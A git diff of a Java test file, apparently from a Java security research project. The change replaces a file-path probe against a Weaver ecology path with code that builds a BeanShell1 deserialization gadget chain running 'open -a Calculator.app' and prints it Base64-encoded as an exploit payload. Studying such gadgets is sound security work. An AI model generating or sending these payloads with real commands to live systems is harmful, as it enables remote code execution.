@@ -12,6 +12,7 @@ import cn.hutool.crypto.symmetric.SymmetricCrypto;
 import cn.hutool.json.JSONArray;
 import cn.hutool.json.JSONObject;
 import cn.hutool.json.JSONUtil;
+import com.pinger.javasec.common.BeanShell1;
 import com.pinger.javasec.common.CC2;
 import com.pinger.javasec.common.CC3;
 import com.pinger.javasec.fastjson.User;
@@ -1022,13 +1023,14 @@ public class BasicTest {
 
     @Test
     public void testFileEnc()throws Exception{
-        String path = "H:\\WEAVER\\ecology\\filesystem\\weboffice\\fuck%2ehtml";
-        File file = new File(path);
-        if(file.exists()){
-            System.out.println("hack");
-        }else{
-            System.out.println("dumy...........");
-        }
+        PriorityQueue object = BeanShell1.getObject("open -a Calculator.app");
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(object);
+
+        String encode = Base64.encode(byteArrayOutputStream.toByteArray());
+        System.out.println(encode);
 
 
     }
